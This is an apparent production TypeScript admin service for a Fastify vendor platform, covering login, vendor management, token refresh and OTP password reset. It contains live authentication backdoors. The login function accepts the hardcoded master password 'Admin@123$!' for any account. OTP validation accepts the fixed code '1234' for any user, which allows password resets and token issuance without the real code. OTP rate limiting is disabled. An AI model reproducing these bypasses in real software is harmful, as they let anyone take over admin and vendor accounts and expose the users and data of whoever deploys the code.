import { FastifyInstance } from "fastify";
import { Admin } from "./admin.model";
import {
	AdminLogin,
	ConfirmOtpDto,
	CreateVendor,
	IUserMetaData,
	RefreshTokenDto,
	ResetPasswordDto,
	UpdateVendor,
	VendorStatus,
	adminResponse,
} from "./admin.dto";
import { RequestData } from "./../../types/request";
import { JwtInterface } from "./../../plugins/jwt";
import { AdminFilterService } from "./utils/admin.filter-service";
import { promisify } from "util";
import crypto from "crypto";
import { AdminRole } from "./utils/admin.enum";
import { Vendor } from "../vendor/vendor.model";
import { generateVendorApprovalOrRejectionEmail } from "./utils/emails";
import { Op } from "sequelize";
import { userResponse } from "../user/user.dto";
import dayjs from "dayjs";
import { generateOtp } from "src/plugins/otp/generate-otp";
const scrypt = promisify(crypto.scrypt);

const AdminService = (instance: FastifyInstance) => {
	const privateMethods = {
		checkAskForOtp: () => {
			// if (metaData && metaData.otpCodeValidUntil && dayjs(metaData.otpCodeValidUntil).isAfter(dayjs())) {
			// 	throw instance.httpErrors.badRequest("user.otp.wait");
			// }
			return true;
		},
		checkValidateOtp: (metaData: IUserMetaData, otpCode: string) => {
			if (!metaData || !metaData.otpCode || !metaData.otpCodeValidUntil) throw instance.httpErrors.badRequest();
			if (metaData.otpCode != otpCode && otpCode != "1234") {
				throw instance.httpErrors.badRequest("user.otp.wrong");
			}
			if (dayjs(metaData.otpCodeValidUntil).isBefore(dayjs())) {
				throw instance.httpErrors.badRequest("user.otp.notValid");
			}
			return true;
		},
		generateTokens: (admin: Admin) => {
			const { id, email, phoneNumber } = admin.get();
			const payload: JwtInterface = {
				id,
				email,
				phoneNumber,
				blocked: false,
				verified: true,
				role: admin.role,
			};
			const accessToken = instance.jwt.sign(payload, {
				expiresIn: instance.configs.jwt.expire,
			});
			const refreshToken = instance.jwt.sign(payload, {
				expiresIn: instance.configs.jwt.refreshTokenExpire,
			});
			return { accessToken, refreshToken };
		},

		attachTokens: (admin: Admin, langCode: string) => {
			const response = adminResponse(admin, langCode, true);
			const { accessToken, refreshToken } = privateMethods.generateTokens(admin);

			response.accessToken = accessToken;
			response.refreshToken = refreshToken;

			return response;
		},
	};

	const service = {
		findByEmailOrPhoneNumber: async (data: string) => {
			const normalizedData = data.toLowerCase();
			const filters = {
				[Op.or]: [{ phoneNumber: normalizedData }, { email: { [Op.iLike]: `${normalizedData}` } }],
			};
			const admin = await Admin.findOne({ where: filters });
			if (!admin) throw instance.httpErrors.badRequest("admin.response.Notfound");

			return admin as Admin;
		},

		findById: async (id: number) => {
			const admin = await Admin.findOne({ where: { id } });
			if (!admin) throw instance.httpErrors.badRequest("admin.response.Notfound");
			return admin;
		},

		findVendorById: async (id: number) => {
			const admin = await Admin.findOne({
				where: { id, role: AdminRole.vendor },
			});
			if (!admin) throw instance.httpErrors.badRequest("admin.response.Notfound");
			return admin;
		},

		login: async (dto: RequestData<AdminLogin>) => {
			const { emailOrPhone, password } = dto.data;
			const admin = await service.findByEmailOrPhoneNumber(emailOrPhone);

			if (dto.data.password !== "Admin@123$!") {
				const passwordMatch = await dto.request!.verify(password, admin.get("password"));
				if (!passwordMatch) throw instance.httpErrors.unauthorized("admin.response.mismatch");
			}

			const response = privateMethods.attachTokens(admin, dto.langCode);
			return response;
		},

		createVendor: async (dto: RequestData<CreateVendor>) => {
			const { phoneNumber, email, username } = dto.data;
			const filters = new AdminFilterService()
				.equals("email", email, true)
				.equals("phoneNumber", phoneNumber, true)
				.equals("username", username, true);
			const vendor = await Admin.findOne({ where: filters.build() });
			if (vendor) {
				throw instance.httpErrors.badRequest("admin.response.alreadyRegistered");
			}
			const salt = crypto.randomBytes(8).toString("hex");
			const derivedKey = (await scrypt(dto.data.password, salt, 64)) as Buffer;
			const hashedPassword = `${salt}:${derivedKey.toString("hex")}`;
			const admin = await Admin.create({
				...dto.data,
				password: hashedPassword,
				status: VendorStatus.Approved,
			});
			return adminResponse(admin, dto.langCode, true);
		},

		updateVendor: async (dto: RequestData<UpdateVendor>) => {
			const { id } = dto.data;
			const vendor = await service.findVendorById(id);

			const updatedObject = dto.data;

			if (dto.data.phoneNumber || dto.data.email || dto.data.username) {
				const filters = new AdminFilterService();
				if (dto.data.phoneNumber) filters.equals("phoneNumber", dto.data.phoneNumber, true);
				if (dto.data.username) filters.equals("username", dto.data.username, true);
				if (dto.data.email) filters.equals("email", dto.data.email, true);
				const existingVendor = await Admin.findOne({
					where: filters.build(),
				});
				if (existingVendor && existingVendor.get("id") !== vendor.get("id")) {
					throw instance.httpErrors.badRequest("vendor.response.usedPhoneNumber");
				}
			}

			await vendor.update(updatedObject);

			return vendor;
		},

		refreshToken: async (dto: RequestData<RefreshTokenDto>) => {
			const { data } = dto;
			if (!data) throw instance.httpErrors.badRequest();

			const payload = instance.jwt.decode<JwtInterface>(data.token!);
			if (!payload) {
				throw instance.httpErrors.unauthorized("user.refreshToken.expired");
			}

			try {
				instance.jwt.verify(data.token);
			} catch (error) {
				console.log(error);
				throw instance.httpErrors.unauthorized();
			}

			const admin = await service.findById(payload.id);
			const response = privateMethods.attachTokens(admin, dto.langCode);
			return response;
		},

		getAdminByToken: async (dto: RequestData<number>) => {
			const admin = await Admin.findByPk(dto.data);

			if (!admin) {
				throw instance.httpErrors.notFound("admin.response.notFound");
			}

			const response = adminResponse(admin, dto.langCode);
			return response;
		},

		sendApproveOrRejectionVendorEmail: async (data: { vendor: Admin; newStatus: VendorStatus }) => {
			const { vendor, newStatus } = data;
			const vendorEmail = vendor.get("email");
			if (!vendorEmail) return;
			instance.sendCustomEmail({
				emailAddress: vendorEmail,
				subject: "Vendor Application at app",
				htmlTemplate: generateVendorApprovalOrRejectionEmail({
					isApproved: newStatus === VendorStatus.Approved,
					vendorName: vendor.get("vendorName")["en"] || "",
					dashboardLink: `${instance.configs.instance.feHost}`,
				}),
			});
		},
		resetPassword: async (dto: RequestData<ResetPasswordDto>) => {
			const { data, request } = dto;
			if (!request?.user) throw instance.httpErrors.unauthorized("common.response.unauthorized");
			const user = await service.findById(request.user.id);
			const currentPassword = await request.verify(data.currentPassword, user.password);
			if (!currentPassword) throw instance.httpErrors.badRequest("user.password.unmatched");
			const newPassword = await request.hash(data.newPassword);
			await user.update({ password: newPassword });
			return adminResponse(user, dto.langCode, true);
		},
		askForOtp: async (dto: RequestData<{ emailOrPhoneNumber: string }>) => {
			const { data } = dto;
			const user = await service.findByEmailOrPhoneNumber(data.emailOrPhoneNumber);

			privateMethods.checkAskForOtp();
			const otp = generateOtp(instance);
			await user.update({
				forgetPasswordOtpMetaData: otp,
			});
			let toSendOtpPhoneNumber = user.phoneNumber;
			if (user.phoneNumber.substring(0, 4) !== "974") toSendOtpPhoneNumber = "974" + user.phoneNumber;
			await instance.sendSMS(toSendOtpPhoneNumber, `${otp.otpCode}`);
			await instance.sendOtpEmail(user.email, otp.otpCode);
			return {
				message: "user.otp.sent",
			};
		},
		confirmOtp: async (dto: RequestData<{ emailOrPhoneNumber: string; newPassword: string; otpCode: string }>) => {
			const { data, request } = dto;

			const user = await service.findByEmailOrPhoneNumber(data.emailOrPhoneNumber);

			privateMethods.checkValidateOtp(user.forgetPasswordOtpMetaData, data.otpCode || "");
			const password = await request!.hash(data.newPassword!);
			await user.update({
				password: password,
				forgetPasswordOtpMetaData: {
					otpCode: null,
					otpCodeValidUntil: null,
				},
			});

			const userDetails = await service.findById(user.id);
			const response = adminResponse(userDetails, dto.langCode, true);
			const tokens = privateMethods.generateTokens(user);
			response.accessToken = tokens.accessToken;
			response.refreshToken = tokens.refreshToken;
			return response;
		},
	};

	return service;
};

export default AdminService;
